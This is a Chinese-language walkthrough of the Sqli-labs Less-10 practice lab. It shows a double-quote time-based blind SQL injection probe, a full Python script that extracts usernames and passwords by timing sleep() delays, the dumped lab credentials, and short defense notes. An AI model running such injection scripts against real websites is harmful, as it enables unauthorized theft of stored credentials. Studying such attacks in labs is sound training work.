## 题目: Sqli-labs Less-10

## 题目描述
本关题目名为 `Blind - Time based - Double Quotes - String`。页面没有任何报错回显，也没有数据回显，无论输入什么，永远只显示 `You are in...`。与 Less-9 不同的是，本关的闭合符号变为了**双引号 `"`**。

## 解题思路
延续 Less-9 的时间盲注思路：利用 `sleep()` 函数配合 `if()` 逻辑判断，通过 Python 脚本测量请求耗时，逐个字符提取 `users` 表的数据。唯一需要修改的就是将 Payload 中的单引号替换为双引号。

## 解题步骤
**1. 探测闭合方式**
输入 `?id=1" and sleep(3) --+`，页面卡顿 3 秒，确认双引号闭合成功。

**2. 编写时间盲注 Python 脚本**
修改 `query` 变量，并将 Payload 的闭合符改为双引号。

**实战 Payload 核心代码**：

```python
import requests
import time

url = "http://127.0.0.1/sqli-labs/Less-10/"
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

print("开始时间盲注爆破 (Less-10 双引号版)...")

for i in range(1, 150):
    low = 32
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        
        # 核心修改点：这里从单引号 ' 改成了双引号 "
        # 外层使用单引号 f'...' 包裹，避免引号冲突
        payload = f'?id=1" and if(ascii(substr({query},{i},1))>{mid},sleep(3),0) --+'
        
        start_time = time.time()
        try:
            r = requests.get(url + payload, timeout=10)
            elapsed_time = time.time() - start_time
        except Exception as e:
            print(f"请求超时或出错: {e}")
            continue
            
        # 核心判断：响应时间大于 2.5 秒说明条件成立
        if elapsed_time >= 2.5:
            low = mid + 1
        else:
            high = mid - 1
            
    if low == 127:
        break
        
    char = chr(low)
    result += char
    print(f"[+] 爆出第 {i} 个字符: {char} | 当前结果: {result}")

print("\n================ 最终结果 ================")
print(result)
print("==========================================")
```
**3. 运行脚本获取数据**
在 CMD 中运行 python less10.py，经过一段时间的等待，成功爆出 users 表的数据：
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy...

## 知识点总结
* 闭合符的灵活变通：时间盲注的核心逻辑（if + sleep）是不变的，无论闭合符是单引号、双引号还是括号，只需调整闭合方式即可。
* Python 字符串引号处理：在构造 Payload 时，如果 SQL 语句中必须包含双引号，Python 的外层字符串可以使用单引号 f'...' 来包裹，防止语法错误。
* 防御策略：使用 PDO 预编译彻底隔绝注入；限制数据库查询的响应时间。
